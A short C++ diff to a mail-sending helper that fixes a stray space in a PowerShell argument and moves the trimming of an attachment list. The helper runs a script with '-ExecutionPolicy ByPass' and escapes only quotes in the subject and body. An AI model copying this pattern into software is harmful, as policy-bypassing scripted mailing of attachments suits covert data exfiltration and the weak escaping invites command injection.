@@ -108,7 +108,7 @@ namespace Mail
             return -2;
 
         // Run script in admin mode
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                             + StringReplace(subject, "\"", "\\\"")
                             + "\" -Body \""
                             + StringReplace(body, "\"", "\\\"")
@@ -158,8 +158,9 @@ namespace Mail
             {
                 for(const auto &v : att)
                     attachments += v + "::";
+                attachments = attachments.substr(0, attachments.length() - 2);
             }
-            attachments = attachments.substr(0, attachments.length() - 2);
+
             return SendMail(subject, body, attachments);
     }
 
